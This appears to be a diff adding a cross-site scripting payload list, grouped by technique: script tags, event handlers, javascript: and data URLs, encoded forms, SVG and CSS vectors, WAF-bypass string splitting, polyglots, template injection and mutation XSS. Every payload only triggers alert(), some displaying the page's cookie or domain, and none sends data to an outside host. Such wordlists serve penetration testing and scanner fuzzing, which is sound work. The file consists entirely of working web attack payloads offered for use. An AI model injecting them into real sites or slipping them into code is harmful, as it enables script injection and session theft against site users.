@@ -1,0 +1,80 @@
+# Basic payloads
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Event handler payloads
+<img src=x onerror=alert(1)>
+<img src=1 onerror=alert(document.domain)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+
+# JavaScript protocol payloads
+javascript:alert(1)
+javascript:alert(document.domain)
+javascript:alert(document.cookie)
+
+# Data URL payloads
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# HTML encoded payloads
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+# Unicode encoded payloads
+%u003Cscript%u003Ealert(1)%u003C/script%u003E
+\u003Cscript\u003Ealert(1)\u003C/script\u003E
+
+# DOM based payloads
+<select onchange=alert(1)><option>1</option><option>2</option></select>
+<marquee onstart=alert(1)>test</marquee>
+<details ontoggle=alert(1)>test</details>
+
+# SVG based payloads
+<svg><script>alert(1)</script></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+# CSS context payloads
+<style>@import 'javascript:alert(1)'</style>
+<x style="background:url('javascript:alert(1)')">
+<x style="behavior:url(javascript:alert(1))">
+
+# Exotic payloads
+<script>eval('al'+'ert(1)')</script>
+<script>[1].find(alert)</script>
+<script>window['alert'](1)</script>
+
+# WAF bypass payloads
+<script>globalThis[`al`+`ert`](1)</script>
+<script>parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain'])</script>
+<script>this[/*foo*/'alert'/*bar*/](1)</script>
+
+# Polyglot payloads
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert(1)//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Template injection payloads
+{{constructor.constructor('alert(1)')()}}
+${alert(1)}
+<%= alert(1) %>
+
+# Parameter pollution payloads
+?param=<script>&param=alert(1)&param=</script>
+?param=<>&param=script>&param=alert(1)&param=</script>
+
+# Mutation XSS payloads
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<math><a xlink:href="javascript:alert(1)">click</a></math>
+
+# HTTP header injection payloads
+?param=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+?param=<base href="javascript:alert(1)/">
+
+# Modern context payloads
+<script async=alert(1) src=x></script>
+<script defer=alert(1) src=x></script>
+<script type=module>alert(1)</script> 
